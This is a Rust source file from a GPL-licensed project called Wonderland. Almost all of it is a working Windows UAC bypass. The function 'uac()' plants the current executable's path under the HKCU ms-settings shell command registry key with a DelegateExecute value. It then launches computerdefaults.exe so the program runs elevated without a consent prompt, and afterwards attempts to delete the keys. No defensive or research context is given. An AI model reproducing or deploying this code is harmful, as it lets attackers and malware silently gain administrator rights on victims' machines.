/*
 * Copyright (C) 2021 Jordan DALCQ (Keyboard-Slayer) & Contributors
 *
 * This file is part of Wonderland.
 *
 * Wonderland is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Wonderland is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Wonderland.  If not, see <http://www.gnu.org/licenses/>.
 */

use std::process::Command;
use std::io;
use std::env::current_exe;

use winreg::{RegKey, RegValue, enums::*};

fn check_create(keyname: &str) -> io::Result<RegKey>
{
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);

    match hkcu.open_subkey_with_flags(format!("Software\\{}", keyname), KEY_WRITE)
    {
        Ok(key) => return Ok(key),
        Err(_) => {
            let key = hkcu.create_subkey_with_flags(format!("Software\\{}", keyname), KEY_WRITE)?;
            return Ok(key.0);
        }
    }
}

pub fn uac() -> io::Result<()>
{
    let raw_path = current_exe()?;
    let path = raw_path.to_str().unwrap();
    
    let data = RegValue {vtype: REG_DWORD, bytes: vec![0]};

    check_create("Classes")?;
    check_create("Classes\\ms-settings")?;
    check_create("Classes\\ms-settings\\shell")?;
    check_create("Classes\\ms-settings\\shell\\open")?;

    let key = check_create("Classes\\ms-settings\\shell\\open\\command")?;
    key.set_value("", &path)?;
    key.set_raw_value("DelegateExecute", &data)?;

    let mut process = Command::new("cmd.exe")
        .args(&["/c start computerdefaults.exe"])
        .spawn()?;

    match process.try_wait()
    {
        Ok(Some(_)) => RegKey::predef(HKEY_CURRENT_USER).delete_subkey_all("Software\\Classes\\ms-settings\\shell")?,
        _ => {},
    }

    Ok(())
}